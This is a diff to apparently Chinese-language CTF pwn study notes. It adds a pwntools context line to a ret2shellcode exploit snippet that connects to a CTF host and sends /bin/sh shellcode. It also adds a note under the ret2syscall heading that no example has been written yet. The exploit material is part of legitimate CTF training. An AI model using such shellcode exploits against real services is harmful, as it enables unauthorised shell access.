@@ -22,6 +22,8 @@ exploit:
 ~~~python
 from pwn import *
 
+context(arch='amd64',os='linux',log_level='debug')
+
 p = remote("node5.anna.nssctf.cn","28975")
 
 shellcode = asm(shellcraft.sh())
@@ -39,7 +41,7 @@ p.interactive()
 
 ## ret2syscall
 
-
+没找到好的例题，先不写。
 
 ## ret2libc
 
